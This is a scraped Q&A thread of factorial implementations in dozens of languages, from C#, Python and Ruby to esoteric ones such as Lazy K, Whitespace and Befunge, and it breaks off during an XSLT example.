<p>Nothing to calculate really, just look it up. To extend it,add another 8 numbers to the table and 64 bit integers are at at their limit. Beyond that, a BigNum class is called for. </p>

<pre><code>public static int Factorial(int f)
{ 
    if (f&lt;0 || f&gt;12)
    {
        throw new ArgumentException(""Out of range for integer factorial"");
    }
    int [] fact={1,1,2,6,24,120,720,5040,40320,362880,3628800,
                 39916800,479001600};
    return fact[f];
}
</code></pre>
 <h1>Whitespace</h1>

<pre>
&#32;&#32;&#32;&#09;.
&#32;.
&#32;&#09;.
&#09;&#09;.
&#32;&#32;&#09;.
&#32;&#32;&#32;&#09;.
&#09;&#09;&#09;&#32;.
&#32;.
&#09;&#32;&#09;&#32;.
&#09;&#32;&#32;.
&#32;&#32;&#32;&#09;.
&#32;.
&#32;&#32;.
&#32;&#09;&#09;&#09;&#32;.
&#09;&#09;&#32;&#32;&#09;&#09;&#09;&#32;.
&#32;.
&#09;.
.
&#32;&#32;&#09;&#32;.
&#32;.
.
&#09;.
&#32;&#09;.
.
.
.
</pre>

<p>It was hard to get it to show here properly, but now I tried copying it from the preview and it works. You need to input the number and press enter.</p>
 <h1>Delphi</h1>

<pre><code>facts: array[2..12] of integer;

function TForm1.calculate(f: integer): integer;
begin
    if f = 1 then
      Result := f
    else if f &gt; High(facts) then
      Result := High(Integer)
    else if (facts[f] &gt; 0) then
      Result := facts[f]
    else begin
      facts[f] := f * Calculate(f-1);
      Result := facts[f];
    end;
end;

initialize

  for i := Low(facts) to High(facts) do
    facts[i] := 0;
</code></pre>

<p>After the first time a factorial higher or equal to the desired value has been calculated, this algorithm just returns the factorial in constant time O(1).</p>

<p>It takes in account that int32 only can hold up to 12!</p>
 <h1><a href=""http://homepages.cwi.nl/~tromp/cl/lazy-k.html"" rel=""nofollow"">Lazy</a> <a href=""http://esoteric.sange.fi/essie2/download/"" rel=""nofollow"" title=""download it"">K</a></h1>

<p>Your pure functional programming nightmares come true!</p>

<p>The only <a href=""http://en.wikipedia.org/wiki/Esoteric_programming_language"" rel=""nofollow"">Esoteric Turing-complete Programming Language</a> that has:</p>

<ul>
<li>A purely functional foundation, core, and libraries---in fact, here's the complete API: <a href=""http://en.wikipedia.org/wiki/SKI_combinator_calculus"" rel=""nofollow"">S K I</a></li>
<li>No <a href=""http://en.wikipedia.org/wiki/Lambda_calculus"" rel=""nofollow"">lambdas</a> even!</li>
<li>No <a href=""http://en.wikipedia.org/wiki/Church_encoding#Church_numerals"" rel=""nofollow"">numbers</a> or lists needed or allowed</li>
<li>No explicit recursion but yet, <a href=""http://mvanier.livejournal.com/2897.html"" rel=""nofollow"" title=""Mike Vanier - Y Combinator (Slight Return"">allows recursion</a></li>
<li>A simple <a href=""http://mitpress.mit.edu/sicp/full-text/sicp/book/node71.html"" rel=""nofollow"">infinite lazy stream</a>-based I/O mechanism</li>
</ul>

<p>Here's the Factorial code in all its parenthetical glory:</p>

<pre><code>K(SII(S(K(S(S(KS)(S(K(S(KS)))(S(K(S(KK)))(S(K(S(K(S(K(S(K(S(SI(K(S(K(S(S(KS)K)I))
 (S(S(KS)K)(SII(S(S(KS)K)I))))))))K))))))(S(K(S(K(S(SI(K(S(K(S(SI(K(S(K(S(S(KS)K)I))
 (S(S(KS)K)(SII(S(S(KS)K)I))(S(S(KS)K))(S(SII)I(S(S(KS)K)I))))))))K)))))))
 (S(S(KS)K)(K(S(S(KS)K)))))))))(K(S(K(S(S(KS)K)))K))))(SII))II)
</code></pre>

<p>Features:</p>

<ul>
<li>No subtraction or conditionals</li>
<li>Prints all factorials (if you wait long enough)</li>
<li>Uses a second layer of Church numerals to convert the Nth factorial to N! asterisks followed by a newline</li>
<li>Uses the <a href=""http://en.wikipedia.org/wiki/Fixed_point_combinator#Y_combinator"" rel=""nofollow"">Y combinator</a> for recursion</li>
</ul>

<p>In case you are interested in trying to understand it, here is the Scheme source code to run through the Lazier compiler:</p>

<pre><code>(lazy-def '(fac input)
   '((Y (lambda (f n a) ((lambda (b) ((cons 10) ((b (cons 42)) (f (1+ n) b))))
       (* a n)))) 1 1))
</code></pre>

<p>(for suitable definitions of Y, cons, 1, 10, 42, 1+, and *).</p>

<p>EDIT:</p>

<h1>Lazy K Factorial in Decimal</h1>

<p>(<a href=""http://www.updike.org/hazy/facdec.lazy"" rel=""nofollow"">10KB of gibberish</a> or else I would paste it). For example, at the Unix prompt:</p>

<pre>
    $ echo ""4"" | ./lazy facdec.lazy
    24
    $ echo ""5"" | ./lazy facdec.lazy
    120
</pre>

<p>Rather slow for numbers above, say, 5.</p>

<p>The code is sort of bloated because we have to include <a href=""http://www.updike.org/hazy/factorialDecimal.hazy"" rel=""nofollow"">library code for all of our own primitives</a> (code written in <a href=""http://www.updike.org/hazy/"" rel=""nofollow"">Hazy</a>, a lambda calculus interpreter and LC-to-Lazy K compiler written in Haskell).</p>
 <h1>C#: LINQ</h1>

<pre><code>    public static int factorial(int n)
    {
        return (Enumerable.Range(1, n).Aggregate(1, (previous, value) =&gt; previous * value));
    }
</code></pre>
 <p>The problem with most of the above is that they will run out of precision at about 25! (12! with 32 bit ints) or just overflow. Here's a c# implementation to break through these limits!</p>

<pre><code>class Number
{
  public Number ()
  {
    m_number = ""0"";
  }

  public Number (string value)
  {
    m_number = value;
  }

  public int this [int column]
  {
    get
    {
      return column &lt; m_number.Length ? m_number [m_number.Length - column - 1] - '0' : 0;
    }
  }

  public static implicit operator Number (string rhs)
  {
    return new Number (rhs);
  }

  public static bool operator == (Number lhs, Number rhs)
  {
    return lhs.m_number == rhs.m_number;
  }

  public static bool operator != (Number lhs, Number rhs)
  {
    return lhs.m_number != rhs.m_number;
  }

  public override bool Equals (object obj)
  {
     return this == (Number) obj;
  }

  public override int GetHashCode ()
  {
    return m_number.GetHashCode ();
  }

  public static Number operator + (Number lhs, Number rhs)
  {
    StringBuilder
      result = new StringBuilder (new string ('0', lhs.m_number.Length + rhs.m_number.Length));

    int
      carry = 0;

    for (int i = 0 ; i &lt; result.Length ; ++i)
    {
      int
        sum = carry + lhs [i] + rhs [i],
        units = sum % 10;

      carry = sum / 10;

      result [result.Length - i - 1] = (char) ('0' + units);
    }

    return TrimLeadingZeros (result);
  }

  public static Number operator * (Number lhs, Number rhs)
  {
    StringBuilder
      result = new StringBuilder (new string ('0', lhs.m_number.Length + rhs.m_number.Length));

    for (int multiplier_index = rhs.m_number.Length - 1 ; multiplier_index &gt;= 0 ; --multiplier_index)
    {
      int
        multiplier = rhs.m_number [multiplier_index] - '0',
        column = result.Length - rhs.m_number.Length + multiplier_index;

      for (int i = lhs.m_number.Length - 1 ; i &gt;= 0 ; --i, --column)
      {
        int
          product = (lhs.m_number [i] - '0') * multiplier,
          units = product % 10,
          tens = product / 10,
          hundreds = 0,
          unit_sum = result [column] - '0' + units;

        if (unit_sum &gt; 9)
        {
          unit_sum -= 10;
          ++tens;
        }

        result [column] = (char) ('0' + unit_sum);

        int
          tens_sum = result [column - 1] - '0' + tens;

        if (tens_sum &gt; 9)
        {
          tens_sum -= 10;
          ++hundreds;
        }

        result [column - 1] = (char) ('0' + tens_sum);

        if (hundreds &gt; 0)
        {
          int
            hundreds_sum = result [column - 2] - '0' + hundreds;

          result [column - 2] = (char) ('0' + hundreds_sum);
        }
      }
    }

    return TrimLeadingZeros (result);
  }

  public override string ToString ()
  {
    return m_number;
  }

  static string TrimLeadingZeros (StringBuilder number)
  {
    while (number [0] == '0' &amp;&amp; number.Length &gt; 1)
    {
      number.Remove (0, 1);
    }

    return number.ToString ();
  }

  string
    m_number;
}

static void Main (string [] args)
{
  Number
    a = new Number (""1""),
    b = new Number (args [0]),
    one = new Number (""1"");

  for (Number c = new Number (""1"") ; c != b ; )
  {
    c = c + one;
    a = a * c;
  }

  Console.WriteLine (string.Format (""{0}! = {1}"", new object [] { b, a }));
}
</code></pre>

<p>FWIW: 10000! is over 35500 character long.</p>

<p>Skizz</p>
 <h1>Python: Functional, One-liner</h1>

<pre><code>factorial = lambda n: reduce(lambda x,y: x*y, range(1, n+1), 1)
</code></pre>

<p>NOTE:</p>

<ul>
<li>It supports big integers. Example:</li>
</ul>

<hr>

<pre><code>print factorial(100)
93326215443944152681699238856266700490715968264381621468592963895217599993229915\
608941463976156518286253697920827223758251185210916864000000000000000000000000
</code></pre>

<hr>

<ul>
<li>It does not work for <em>n &lt; 0</em>.</li>
</ul>
 <p>This is one of the faster algorithms, up to <a href=""http://www.google.com/search?q=170!"" rel=""nofollow"">170!</a>.  It <a href=""http://www.google.com/search?q=171!"" rel=""nofollow"">fails</a> inexplicably beyond 170!, and it's relatively slow for small factorials, but for factorials between <a href=""http://www.google.com/search?q=80!"" rel=""nofollow"">80</a> and <a href=""http://www.google.com/search?q=170!"" rel=""nofollow"">170</a> it's blazingly fast compared to many algorithms.</p>

<pre><code>curl http://www.google.com/search?q=170!
</code></pre>

<p>There's also an online interface, <a href=""http://www.google.com/search?q=42!"" rel=""nofollow"">try it out now!</a> </p>

<p>Let me know if you find a bug, or faster implementation for large factorials.</p>

<p><hr /></p>

<h3>EDIT:</h3>

<p>This algorithm is slightly slower, but gives results beyond 170:</p>

<pre><code>curl http://www58.wolframalpha.com/input/?i=171!
</code></pre>

<p>It also simplifies them into various other representations.</p>
 <h1>Python, C/C++ (weave): Multi-Language, Procedural</h1>

<p>Four implementations:</p>

<ul>
<li>[weave]</li>
<li>[python]</li>
<li>[psyco]</li>
<li>[list]</li>
</ul>

<p>Code:</p>

<pre><code>#!/usr/bin/env python
"""""" weave_factorial.py

""""""
# [weave] factorial() as extension module in C++
from scipy.weave import ext_tools

def build_factorial_ext():
    func = ext_tools.ext_function(
        'factorial', 
        r""""""
        unsigned long long i = 1;
        for ( ; n &gt; 1; --n)
          i *= n;

        PyObject *o = PyLong_FromUnsignedLongLong(i);
        return_val = o;
        Py_XDECREF(o); 
        """""",  
        ['n'], 
        {'n': 1}, # effective type declaration
        {})
    mod = ext_tools.ext_module('factorial_ext')
    mod.add_function(func)
    mod.compile()

try: from factorial_ext import factorial as factorial_weave
except ImportError:
    build_factorial_ext()
    from factorial_ext import factorial as factorial_weave


# [python] pure python procedural factorial()
def factorial_python(n):
    i = 1
    while n &gt; 1:
        i *= n
        n -= 1
    return i


# [psyco] factorial() psyco-optimized
try:
    import psyco
    factorial_psyco = psyco.proxy(factorial_python)
except ImportError:
    pass


# [list] list-lookup factorial()
factorials = map(factorial_python, range(21))   
factorial_list = lambda n: factorials[n]
</code></pre>

<p><hr /></p>

<p>Measure relative performance:</p>

<pre><code>$ python -mtimeit \
         -s ""from weave_factorial import factorial_$label as f"" ""f($n)""
</code></pre>

<ol>
<li><p>n = 12</p>

<ul>
<li>[weave] 0.70 &micro;sec (<strong>2</strong>)</li>
<li>[python] 3.8 &micro;sec (<strong>9</strong>)</li>
<li>[psyco]  1.2 &micro;sec (<strong>3</strong>)</li>
<li>[list]  0.43 &micro;sec (<strong>1</strong>)</li>
</ul></li>
<li><p>n = 20 </p>

<ul>
<li>[weave] 0.85 &micro;sec (<strong>2</strong>)</li>
<li>[python] 9.2 &micro;sec (<strong>21</strong>)</li>
<li>[psyco]  4.3 &micro;sec (<strong>10</strong>)</li>
<li>[list]  0.43 &micro;sec (<strong>1</strong>)</li>
</ul></li>
</ol>

<p><em>&micro;sec</em> stands for microseconds.</p>
 <h1>Lambda Calculus</h1>

<p>Input and output are Church numerals (i.e. natural number <code>k</code> is <code>\f n. f^k n</code>; so <code>3 = \f n. f (f (f n)))</code></p>

<pre><code>(\x. x x) (\y f. f (y y f)) (\y n. n (\x y z. z) (\x y. x) (\f n. f n) (\f. n (y (\f m. n (\g h. h (g f)) (\x. m) (\x. x)) f)))
</code></pre>
 <h1>Ruby: Iterative</h1>

<pre><code>def factorial(n)
  (1 .. n).inject{|a, b| a*b}
end
</code></pre>

<h1>Ruby: Recursive</h1>

<pre><code>def factorial(n)
  n == 1 ? 1 : n * factorial(n-1)
end
</code></pre>
 <p>Nemerle: Functional</p>

<pre><code>def fact(n) {
    | 0 =&gt; 1
    | x =&gt; x * fact(x-1)
}
</code></pre>
 <pre><code>#Language: T-SQL
#Style: Recursive, divide and conquer
</code></pre>

<p>Just for fun - in T-SQL using a divide and conquer recursive method. Yes, recursive - in SQL without stack overflow.</p>

<pre><code>create function factorial(@b int=1, @e int) returns float as begin
  return case when @b&gt;=@e then @e else 
      convert(float,dbo.factorial(@b,convert(int,@b+(@e-@b)/2)))
    * convert(float,dbo.factorial(convert(int,@b+1+(@e-@b)/2),@e)) end
end
</code></pre>

<p>call it like this:</p>

<pre><code>print dbo.factorial(1,170) -- the 1 being the starting number
</code></pre>
 <pre><code>#Language: T-SQL
#Style: Big Numbers
</code></pre>

<p>Here's another T-SQL solution -- supports big numbers in a most Rube Goldbergian manner. Lots of set-based ops. Tried to keep it uniquely SQL. Horrible performance (400! took 33 seconds on a Dell Latitude D830)</p>

<pre><code>create function bigfact(@x varchar(max)) returns varchar(max) as begin
  declare @c int
  declare @n table(n int,e int)
  declare @f table(n int,e int)

  set @c=0
  while @c&lt;len(@x) begin
    set @c=@c+1
    insert @n(n,e) values(convert(int,substring(@x,@c,1)),len(@x)-@c)
  end

  -- our current factorial
  insert @f(n,e) select 1,0

  while 1=1 begin
    declare @p table(n int,e int)
    delete @p
    -- product
    insert @p(n,e) select sum(f.n*n.n), f.e+n.e from @f f cross join @n n group by f.e+n.e

    -- normalize
    while 1=1 begin
      delete @f
      insert @f(n,e) select sum(n),e from (
        select (n % 10) as n,e from @p union all 
        select (n/10) % 10,e+1 from @p union all 
        select (n/100) %10,e+2 from @p union all 
        select (n/1000)%10,e+3 from @p union all 
        select (n/10000) % 10,e+4 from @p union all 
        select (n/100000)% 10,e+5 from @p union all 
        select (n/1000000)%10,e+6 from @p union all 
        select (n/10000000) % 10,e+7 from @p union all 
        select (n/100000000)% 10,e+8 from @p union all 
        select (n/1000000000)%10,e+9 from @p
      ) f group by e having sum(n)&gt;0

      set @c=0
      select @c=count(*) from @f where n&gt;9
      if @c=0 break
      delete @p
      insert @p(n,e) select n,e from @f
    end

    -- decrement
    update @n set n=n-1 where e=0

    -- normalize
    while 1=1 begin
      declare @e table(e int)
      delete @e
      insert @e(e) select e from @n where n&lt;0
      if @@rowcount=0 break

      update @n set n=n+10 where e in (select e from @e)
      update @n set n=n-1 where e in (select e+1 from @e)
    end  

    set @c=0
    select @c=count(*) from @n where n&gt;0
    if @c=0 break
  end

  select @c=max(e) from @f
  set @x=''
  declare @l varchar(max)
  while @c&gt;=0 begin
    set @l='0'
    select @l=convert(varchar(max),n) from @f where e=@c
    set @x=@x+@l
    set @c=@c-1
  end
  return @x
end
</code></pre>

<p>Example:</p>

<pre><code>print dbo.bigfact('69')
</code></pre>

<p>returns:</p>

<pre><code>171122452428141311372468338881272839092270544893520369393648040923257279754140647424000000000000000
</code></pre>
 <p>I find the following implementations just hilarious:</p>

<p><a href=""http://www.willamette.edu/~fruehr/haskell/evolution.html"" rel=""nofollow"">The Evolution of a Haskell Programmer</a></p>

<p><a href=""http://dis.4chan.org/read/prog/1180084983/"" rel=""nofollow"">Evolution of a Python programmer</a></p>

<p>Enjoy!</p>
 <h1>ruby recursive</h1>

<pre><code>(factorial=Hash.new{|h,k|k*h[k-1]})[1]=1
</code></pre>

<p>usage:</p>

<pre><code>factorial[5]
 =&gt; 120
</code></pre>
 <h1>Language Name: <a href=""http://chuck.cs.princeton.edu/"" rel=""nofollow"">ChucK</a></h1>

<pre><code>Moog moog =&gt; dac;
4.0 =&gt; moog.gain;

for (0 =&gt; int i; i &lt; 8; i++) {
    &lt;&lt;&lt; factorial(i) &gt;&gt;&gt;;
}

fun int factorial(int n) {
    1 =&gt; int result;
    if (n != 0) {
        n * factorial(n - 1) =&gt; result;
    }

    Std.mtof(result % 128) =&gt; moog.freq;
    0.25::second =&gt; now;

    return result;
}
</code></pre>

<p>And it sounds like <a href=""http://www.automatous-monk.com/mp3s/misc/Factorial.mp3"" rel=""nofollow"">this</a>.  Not terribly interesting, but, hey, it's just a factorial function!</p>
 <h1>Brainf*ck</h1>

<pre><code>+++++
&gt;+&lt;[[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[-&lt;&lt;&lt;&lt;+&gt;&gt;+&gt;&gt;]&lt;&lt;&lt;&lt;&gt;[-&gt;&gt;+&lt;&lt;]&lt;&gt;&gt;&gt;[-&lt;[-&gt;&gt;+&lt;&lt;]&gt;&gt;[-&lt;&lt;+&lt;+&gt;&gt;&gt;]&lt;]&lt;[-]&gt;&lt;&lt;&lt;-]
</code></pre>

<p>Written by Michael Reitzenstein.</p>
 <h1><a href=""http://en.wikipedia.org/wiki/APL_(programming_language)"" rel=""nofollow"">APL</a> (oddball/one-liner):</h1>

<pre><code>×/⍳X
</code></pre>

<ol>
<li>⍳X expands X into an array of the integers 1..X</li>
<li>×/ multiplies every element in the array</li>
</ol>

<p>Or with the built-in operator:</p>

<pre><code>!X
</code></pre>

<p>Source: <a href=""http://www.webber-labs.com/mpl/lectures/ppt-slides/01.ppt"" rel=""nofollow"">http://www.webber-labs.com/mpl/lectures/ppt-slides/01.ppt</a></p>
 <h1>Bash: Recursive</h1>

<p>In bash and recursive, but with the added advantage that it deals with each iteration in a new process. The max it can calculate is !20 before overflowing, but you can still run it for big numbers if you don't care about the answer and want your system to fall over ;)</p>

<pre><code>#!/bin/bash
echo $(($1 * `( [[ $1 -gt 1 ]] && ./$0 $(($1 - 1)) ) || echo 1`));
</code></pre>
 <p>Here is an interesting Ruby version.  On my laptop it will find 30000! in under a second.  (It takes longer for Ruby to format it for printing than to calculate it.)  This is significantly faster than the naive solution of just multiplying the numbers in order.</p>

<pre><code>def factorial (n)
  return multiply_range(1, n)
end

def multiply_range(n, m)
  if (m &lt; n)
    return 1
  elsif (n == m)
    return m
  else
    i = (n + m) / 2
    return multiply_range(n, i) * multiply_range(i+1, m)
  end
end
</code></pre>
 <p>Simple solutions are the best:</p>

<pre><code>#include &lt;stdexcept&gt;;

long fact(long f)
{
    static long fact [] = { 1, 1, 2, 6, 24, 120, 720, 5040, 40320, 362880, 3628800, 39916800, 479001600, 1932053504, 1278945280, 2004310016, 2004189184 };
    static long max     = sizeof(fact)/sizeof(long);

    if ((f &lt; 0) || (f &gt;= max))
    {   throw std::range_error(""Factorial Range Error"");
    }

    return fact[f];
}
</code></pre>
 <h1>Common Lisp: Lisp as God intended it to be used (that is, with LOOP)</h1>

<pre><code>(defun fact (n)
  (loop for i from 1 to n
        for acc = 1 then (* acc i)
        finally (return acc)))
</code></pre>

<p>Now, if someone can come up with a version based on FORMAT...</p>
 <h1>Common Lisp: FORMAT (obfuscated)</h1>

<p>Okay, so I'll give it a try myself.</p>

<pre><code>(defun format-fact (stream arg colonp atsignp &amp;rest args)
  (destructuring-bind (n acc) arg
    (format stream
            ""~[~A~:;~*~/format-fact/~]""
            (1- n)
            acc
            (list (1- n) (* acc n)))))

(defun fact (n)
  (parse-integer (format nil ""~/format-fact/"" (list n 1))))
</code></pre>

<p>There has to be a nicer, even more obscure FORMAT-based implementation.  This one is pretty straight-forward and boring, simply using FORMAT as an IF replacement.  Obviously, I'm not a FORMAT expert.</p>
 <h2>Recursively in Inform 7</h2>

<p>(it reminds you of COBOL because it's for writing text adventures; proportional font is deliberate):</p>

<blockquote>
  <p>To decide what number is the factorial of (n - a number):<br>
  &nbsp;&nbsp;&nbsp;&nbsp;if n is zero, decide on one;<br>
  &nbsp;&nbsp;&nbsp;&nbsp;otherwise decide on the factorial of (n minus one) times n.</p>
</blockquote>

<p>If you want to actually call this function (""phrase"") from a game you need to define an action and grammar rule:</p>

<blockquote>
  <p>""The factorial game"" [this must be the first line of the source]</p>
  
  <p>There is a room. [there has to be at least one!]</p>
  
  <p>Factorialing is an action applying to a number.</p>
  
  <p>Understand ""factorial [a number]"" as factorialing.</p>
  
  <p>Carry out factorialing:<br>
  &nbsp;&nbsp;&nbsp;&nbsp;Let n be the factorial of the number understood;<br>
  &nbsp;&nbsp;&nbsp;&nbsp;Say ""It's [n]"".</p>
</blockquote>
 <h1>Scala: Recursive</h1>

<ul>
<li>Should compile to being tail recursive. Should!</li>
</ul>

<p>.</p>

<pre><code>def factorial( value: BigInt ): BigInt = value match {
  case 0 =&gt; 1
  case _ =&gt; value * factorial( value - 1 )
}
</code></pre>
 <p>Occam-pi</p>

<pre><code>PROC subprocess(MOBILE CHAN INT parent.out!,parent.in?)
INT value:
  SEQ
    parent.in ? value
      IF 
        value = 1
          SEQ
            parent.out ! value
        OTHERWISE
          INITIAL MOBILE CHAN INT child.in IS MOBILE CHAN INT:
          INITIAL MOBILE CHAN INT child.out IS MOBILE CHAN INT:
          FORKING
            INT newvalue:
            SEQ
              FORK subprocess(child.in!,child.out?)
              child.out ! (value-1)
              child.in ? newvalue
              parent.out ! (newalue*value)
:

PROC main(CHAN BYTE in?,src!,kyb?)
INITIAL INT value IS 0:
INITIAL MOBILE CHAN INT child.out is MOBILE CHAN INT
INITIAL MOBILE CHAN INT child.in is MOBILE CHAN INT
SEQ 
  WHILE TRUE
    SEQ
      subprocess(child.in!,child.out?)
      child.out ! value
      child.in ? value
      src ! value:
      value := value + 1
:
</code></pre>
 <h1>Icon</h1>

<h2>Recursive function</h2>

<pre><code>procedure factorial(n)
  return (0&lt;n) * factorial(n-1) | 1
end
</code></pre>

<p>I've cheated a bit allowing negatives to return 1. If you want it to fail given a negative argument it's slightly less concise:</p>

<pre><code>  return (0&lt;n) * factorial(n-1) | (n=0 &amp; 1)
</code></pre>

<p>Then</p>

<pre><code>write(factorial(3))
write(factorial(-1))
write(factorial(20))
</code></pre>

<p>prints</p>

<pre><code>6
2432902008176640000
</code></pre>

<h2>Iterative generator</h2>

<pre><code>procedure factorials()
  local f,n
  f := 1; n := 0
  repeat suspend f *:= (n +:= 1)
end
</code></pre>

<p>Then</p>

<pre><code>every write(factorials() \ 5)
</code></pre>

<p>prints</p>

<pre><code>1
2
6
24
120
</code></pre>

<p>To understand this: evaluation is goal-directed and backtracks on failure. There is no boolean type, and binary operators which would return a boolean in other languages, either fail or return their second argument - with the exception of |, which in a single-value context returns its first argument if it succeeds, otherwise tries its second argument. (in a multiple-value context it returns its first argument <em>then</em> its second argument)</p>

<p><code>suspend</code> is like <code>yield</code> in other languages, except that a generator is not explicitly called multiple times to return its results. Instead,
<code>every</code> asks its argument for all values but doesn't return anything by default; it's useful with side-effects (in this case I/O).</p>

<p><code>\</code> limits the number of values returned by a generator, which in the case of <code>factorials</code> would be infinite.</p>
 <p><strong>FoxPro:</strong></p>

<pre><code>function factorial
    parameters n
return iif( n&gt;0, n*factorial(n-1), 1)
</code></pre>
 <h2>OCaml</h2>

<p>Lest anyone believe OCaml and oddball go hand-in-hand, I thought I would provide a sane implementation of factorial.</p>

<pre><code># let rec factorial n =
    if n=0 then 1 else n * factorial(n - 1);;
</code></pre>

<p>I don't think I made my case very well...</p>
 <p><strong>AWK</strong></p>

<pre><code>#!/usr/bin/awk -f
{
    result=1;
    for(i=$1;i&gt;0;i--){
        result=result*i;
    }
    print result;
}
</code></pre>
 <p>Genuinely functional Java:</p>

<pre><code>public final class Factorial {

  public static void main(String[] args) {
    final int n = Integer.valueOf(args[0]);
    System.out.println(""Factorial of "" + n + "" is "" + create(n).apply());
  }

  private static Function create(final int n) {
    return n == 0 ? new ZeroFactorialFunction() : new NFactorialFunction(n);
  }

  interface Function {
    int apply();
  }

  private static class NFactorialFunction implements Function {
    private final int n;
    public NFactorialFunction(final int n) {
      this.n = n;
    }
    @Override
    public int apply() {
      return n * Factorial.create(n - 1).apply();
    }
  }

  private static class ZeroFactorialFunction implements Function {
    @Override
    public int apply() {
      return 1;
    }
  }

}
</code></pre>
 <h1>Erlang: tail recursive</h1>

<pre><code>fac(0) -&gt; 1;
fac(N) when N &gt; 0 -&gt; fac(N, 1).

fac(1, R) -&gt; R;
fac(N, R) -&gt; fac(N - 1, R * N).
</code></pre>
 <pre><code>#Language: T-SQL, C#
#Style: Custom Aggregate
</code></pre>

<p>Another crazy way would be to create a custom aggregate and apply it over a temporary table of the integers 1..n.</p>

<pre><code>/* ProductAggregate.cs */
using System;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;

[Serializable]
[SqlUserDefinedAggregate(Format.Native)]
public struct product {
  private SqlDouble accum;
  public void Init() { accum = 1; }
  public void Accumulate(SqlDouble value) { accum *= value; }
  public void Merge(product value) { Accumulate(value.Terminate()); }
  public SqlDouble Terminate() { return accum; }
}
</code></pre>

<p>add this to sql</p>

<pre><code>create assembly ProductAggregate from 'ProductAggregate.dll' with permission_set=safe -- mod path to point to actual dll location on disk.

create aggregate product(@a float) returns float external name ProductAggregate.product
</code></pre>

<p>create the table (there should be a built-in way to do this in SQL -- hmm. a <a href=""http://stackoverflow.com/questions/58429/sql-set-based-range"" rel=""nofollow"">question</a> for SO?)</p>

<pre><code>select 1 as n into #n union select 2 union select 3 union select 4 union select 5
</code></pre>

<p>then finally</p>

<pre><code>select dbo.product(n) from #n
</code></pre>
 <p>The code below is tongue in cheek, however when you consider that the return value is limited to n &lt; 34 for uint32, &lt;65 uint64 before we run out of space for the return value with a uint, <strong>hard coding 33 values isn't that crazy</strong> :)</p>

<pre><code>public static int Factorial(int n)
{
    switch (n)
    {
    	case 1:
    		return 1;
    	case 2:
    		return 2;
    	case 3:
    		return 6;
    	case 4:
    		return 24;
    	default:
    		throw new Exception(""Sorry, I can only count to 4"");
    }

}
</code></pre>
 <p><strong>C# factorial using recursion in a single line</strong></p>

<pre><code>private static int factorial(int n){ if (n == 0)return 1;else return n * factorial(n - 1); }
</code></pre>
 <h1>Perl6</h1>

<pre><code>sub factorial ($n) { [*] 1..$n }
</code></pre>

<p>I hardly know about Perl6. But I guess this <code>[*]</code> operator is same as Haskell's <code>product</code>.</p>

<p>This code runs on <a href=""http://pugscode.org/"" rel=""nofollow"">Pugs</a>, and maybe <a href=""http://www.parrot.org/"" rel=""nofollow"">Parrot</a> (I didn't check it.)</p>

<p><strong>Edit</strong></p>

<p>This code also works.</p>

<pre><code>sub postfix:&lt;!&gt; ($n) { [*] 1..$n }

# This function(?) call like below ... It looks like mathematical notation.
say 10!;
</code></pre>
 <p>Haskell:</p>

<pre><code>factorial n = product [1..n]
</code></pre>
 <h1><strong>Eiffel</strong></h1>

<pre><code>
class
    APPLICATION
inherit
    ARGUMENTS

create
    make

feature -- Initialization

    make is
            -- Run application.
        local
            l_fact: NATURAL_64
        do
            l_fact := factorial(argument(1).to_natural_64)
            print(""Result is: "" + l_fact.out)
        end

    factorial(n: NATURAL_64): NATURAL_64 is
            --
        require
            positive_n: n >= 0
        do
            if n = 0 then
                Result := 1
            else
                Result := n * factorial(n-1)
            end
        end

end -- class APPLICATION
</code></pre>
 <h1>PostScript: Tail Recursive</h1>

<pre><code>/fact0 { dup 2 lt { pop } { 2 copy mul 3 1 roll 1 sub exch pop fact0 } ifelse } def
/fact { 1 exch fact0 } def
</code></pre>
 <h1>befunge-93</h1>

<pre><code>                                    v
&gt;v""Please enter a number (1-16) : ""0&lt;
,:             &gt;$*99g1-:99p#v_.25*,@
^_&amp;:1-99p&gt;:1-:!|10          &lt; 
         ^     &lt;
</code></pre>

<p>An esoteric language by Chris Pressey of <a href=""http://catseye.tc/"" rel=""nofollow"">Cat's Eye Technologies</a>.</p>
 <h1>dc</h1>

<p>Note: clobbers the <code>e</code> and <code>f</code> registers:</p>

<pre><code>[2++d]se[d1-d_1&lt;fd0&gt;e*]sf
</code></pre>

<p>To use, put the value you want to take the factorial of on the top of the stack and then execute <code>lfx</code> (load the <code>f</code> register and execute it), which then pops the top of the stack and pushes that value's factorial.</p>

<p>Explanation: if the top of the stack is <code>x</code>, then the first part makes the top of the stack look like <code>(x, x-1)</code>.  If the new top-of-stack is non-negative, it calls factorial recursively, so now the stack is <code>(x, (x-1)!)</code> for <code>x</code> >= 1, or <code>(0, -1)</code> for <code>x</code> = 0.  Then, if the new top-of-stack is negative, it executes <code>2++d</code>, which replaces the <code>(0, -1)</code> with <code>(1, 1)</code>.  Finally, it multiplies the top two values on the stack.</p>
 <h1><a href=""http://www.r-project.org/"" rel=""nofollow"">R</a> - using S4 methods (recursively)</h1>

<pre><code>setGeneric( 'fct', function( x ) { standardGeneric( 'fct' ) } )
setMethod( 'fct', 'numeric', function( x ) { 
    lapply( x, function(a) { 
        if( a == 0 ) 1 else a * fact( a - 1 ) 
    } )
} )
</code></pre>

<p>Has the advantage that you can pass arrays of numbers in, and it will work them all out...</p>

<p>eg:</p>

<pre><code>&gt; fct( c( 3, 5, 6 ) )
[[1]]
[1] 6

[[2]]
[1] 120

[[3]]
[1] 720
</code></pre>
 <p><strong>Perl (Y-combinator/Functional)</strong></p>

<pre><code>print sub {
  my $f = shift;
  sub {
    my $f1 = shift;
    $f-&gt;( sub { $f1-&gt;( $f1 )-&gt;( @_ ) } )
  }-&gt;( sub {
    my $f2 = shift;
    $f-&gt;( sub { $f2-&gt;( $f2 )-&gt;( @_ ) } )
  } )
}-&gt;( sub {
  my $h = shift;
  sub {
    my $n = shift;
    return 1 if $n &lt;=1;
    return $n * $h-&gt;($n-1);
  }
})-&gt;(5);
</code></pre>

<p>Everything after 'print' and before the '->(5)' represents the subroutine.
The factorial part is in the final ""sub {...}"". Everything else is to implement the Y-combinator.</p>
 <p>Forth (recursive):</p>

<pre>
: factorial ( n -- n )
    dup 1 > if
        dup 1 - recurse *
    else
        drop 1
     then
;</pre>
 <h2>XSLT 1.0</h2>

<p>The input file, <strong>factorial.xml</strong>:</p>

<pre><code>&lt;?xml version=""1.0""?&gt;
&lt;?xml-stylesheet href=""factorial.xsl"" type=""text/xsl"" ?&gt;
&lt;n&gt;
  20
